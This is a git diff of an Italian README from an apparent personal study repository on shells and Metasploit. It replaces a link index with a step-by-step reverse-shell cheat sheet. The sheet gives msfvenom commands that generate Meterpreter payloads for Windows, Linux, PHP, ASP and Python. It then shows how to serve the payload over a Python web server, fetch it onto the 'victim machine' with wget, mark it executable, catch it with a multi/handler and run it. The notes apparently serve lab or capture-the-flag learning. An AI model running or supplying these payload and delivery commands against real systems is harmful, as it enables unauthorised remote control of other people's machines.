@@ -1,41 +1,36 @@
-# Tools-e-comandi-Shell
+### Creazione payload
 
-La Shell
+- Windows: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f exe > rev_shell.exe**
+- Linux**: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**
+- PHP: **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.php**
+- ASP: **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f asp > rev_shell.asp**
+- Python: **msfvenom -p cmd/meterpreter/reverse_python LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.py**
 
--[Tipi di Shell](https://github.com/emanueletroiani/Tools-e-comandi-Shell/blob/Tipi-di-Shell/README.md)
+### Creazione server condivisione file Python
 
--[Netcat or Socat?](https://github.com/emanueletroiani/Tools-e-comandi-Shell/edit/Netcat-or-Socat/README.md)
+- **python3 -m http.server 9000** creazione python web server per trasferire la shell
 
--[Netcat](https://github.com/emanueletroiani/Tools-e-comandi-Shell/edit/Netcat/README.md)
+![image](https://github.com/user-attachments/assets/a8c8bb47-c71e-4f0b-b30c-3cf05d7b1f4a)
 
--[Socat](https://github.com/emanueletroiani/Tools-e-comandi-Shell/blob/Socat/README.md)
+### Accesso con credenziali ssh
 
--[Socat Encrypted Shell](https://github.com/emanueletroiani/Tools-e-comandi-Shell/edit/Socat-Encrypted-Shell/README.md)
+- **ssh username@targetIP**
+    - inserire password
 
--[Stabilizzare una Shell](https://github.com/emanueletroiani/Tools-e-comandi-Shell/blob/Stabilizzare-una-Shell/README.md)
+### Caricamento del payload sulla macchina vittima
 
--[Common Shell Payloads](https://github.com/emanueletroiani/Tools-e-comandi-Shell/edit/Common-Shell-Payloads/README.md)
+- **wget http://MIO_IP:porta/FILE_SHELL**
+- **chmod +x FILE_SHELL** Cambio di permessi sul payload
 
--[Web Shell](https://github.com/emanueletroiani/Tools-e-comandi-Shell/edit/Web-Shell/README.md)
+![image](https://github.com/user-attachments/assets/9f947c94-93d1-4442-b715-f555c3cc3677)
 
-TOOLS LINUX COMANDI
+### MSFCONSOLE
 
--[Tools](https://github.com/emanueletroiani/Tools-e-comandi-Shell/blob/Tools-Linux-e-comandi/README.md)
+- **use exploit/multi/handler** è il modulo in ascolto sulla macchina attaccante per funzionare come handler (per catturare la shell).
+    - set lhost, lport and run
 
--[Comandi Shell Linux](https://github.com/emanueletroiani/Tools-e-comandi-Shell/tree/Comandi-Shell-Linux)
+### RUN THE SHELL
 
-METASPLOIT
+- **./rev_shell.elf**  avviarlo nella sessione della vittima
 
-Il tool più utilizzato dagli Hacker: Metasploit
 
-Breve guida di MSFConsole
-
-Scansionare un sistema Target
-
-[Database di Metasploit](https://github.com/emanueletroiani/Tools-e-comandi-Shell/tree/Il-database-di-Metasploit)
-
-msfvenom
-
-Attacco msfvenom, creazione di payload
-
-Meterpreter
